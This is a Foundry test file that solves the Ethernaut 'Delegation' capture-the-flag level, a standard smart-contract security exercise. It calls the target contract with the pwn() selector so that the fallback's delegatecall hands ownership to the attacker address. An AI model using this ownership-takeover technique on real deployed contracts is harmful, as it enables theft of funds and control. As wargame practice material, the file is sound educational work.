// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Delegation/Delegation.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut private _ethernaut;
    DelegationFactory private _delegationFactory;
    Delegation private _delegation;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_delegationFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_delegationFactory);
        _delegation = Delegation(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_delegation))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _delegationFactory = new DelegationFactory();
    }

    function testDelegationHack() public testWrapper {
        //console2.log("_delegation before:", _delegation.owner());
        //(bool success, ) = address(_delegation).call{value: 0}(abi.encodeWithSignature("pwn()"));
        (bool success, ) = address(_delegation).call(
            abi.encode(bytes4(keccak256("pwn()")))
        );
        assertTrue(success);
        //console2.log("_delegation after:", _delegation.owner());
    }
}
